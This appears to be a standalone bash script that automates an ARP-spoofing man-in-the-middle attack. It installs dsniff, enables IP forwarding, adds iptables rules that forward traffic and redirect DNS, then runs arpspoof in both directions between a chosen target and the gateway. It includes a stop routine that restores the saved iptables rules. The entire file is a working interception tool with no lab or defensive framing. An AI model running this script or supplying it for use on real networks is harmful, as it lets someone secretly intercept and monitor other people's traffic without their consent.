#!/usr/bin/env bash

function stopme() {
 echo "-> Stopping";
 killall -9 arpspoof; for arpid in $(pidof arpspoof); do kill -9 "${arpid}"; done;
 echo "0" > /proc/sys/net/ipv4/ip_forward; sysctl -w net.ipv4.ip_forward=0;
 if [ -f "iptables.conf" ]; then iptables-restore < iptables.conf; fi;
}
if [ "${1}" == "stop" ]; then stopme; exit;  fi

echo "-> Checking required software";
myapp=dsniff; if [ -z "$(command -v ${myapp})" ]; then apt install ${myapp}; fi;
if [ -z "$(command -v ${myapp})" ]; then echo "-> Please install required software"; exit 0; fi;

function validateip() { if [[ ${1} =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo "-> ip ${1} accepted"; else echo "-> ip ${1} is invalid"; exit 1; fi }

read -e -p "-> Enter Interface: " -i "$(ip route get 8.8.8.8 | awk '/src/{print $5}')" interface;
if [ -z "${interface}" ]; then echo "-> Please set local interface"; exit; fi; 
read -e -p "-> Enter Local IP: " -i "$(ip route get 8.8.8.8 | awk '/src/{print $7}')" myip; validateip "${myip}";
read -e -p "-> Enter Gateway IP: " -i "$(ip route get 8.8.8.8 | awk '/src/{print $3}')" router; validateip "${router}";
read -e -p "-> Enter DNS IP: " -i "8.8.4.4" ipdns; validateip "${ipdns}";
read -e -p "-> Enter Target IP: " -i "${myip%.*}." target; validateip "${target}";

echo "-> Setting up forwarding";
echo "1" > /proc/sys/net/ipv4/ip_forward; sysctl -w net.ipv4.ip_forward=1;
if [ -f "iptables.conf" ]; then mv -f "iptables.conf" "iptables.conf.old"; fi;
iptables-save > iptables.conf;
iptables -I FORWARD 1 -i ${interface} -j ACCEPT;
iptables -I FORWARD 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT;

echo "-> Setting up dns";
for ipchain in 'INPUT' 'FORWARD' 'OUTPUT'; do
 for ipchport in 'tcp' 'udp'; do
  iptables -C ${ipchain} -p ${ipchport} --dport 53 -j ACCEPT &>/dev/null || iptables -A ${ipchain} -p ${ipchport} --dport 53 -j ACCEPT;
 done
done
for ipchprot in 'tcp' 'udp'; do
 iptables -C PREROUTING -t nat -p ${ipchprot} --dport 53 -j DNAT --to-destination ${ipdns}:53 &>/dev/null || iptables -A PREROUTING -t nat -p ${ipchprot} --dport 53 -j DNAT --to-destination ${ipdns}:53;
 iptables -C POSTROUTING -t nat -p ${ipchprot} --dport 53 -j SNAT --to-source ${myip} &>/dev/null || iptables -t nat -A POSTROUTING -p ${ipchprot} --dport 53 -j SNAT --to-source ${myip};
done

echo "-> Running";
arpspoof -i ${interface} -t ${target} ${router} >> /dev/null 2>&1 & disown
arpspoof -i ${interface} -t ${router} ${target} >> /dev/null 2>&1 & disown
# iftop or tcpdump -np port 53
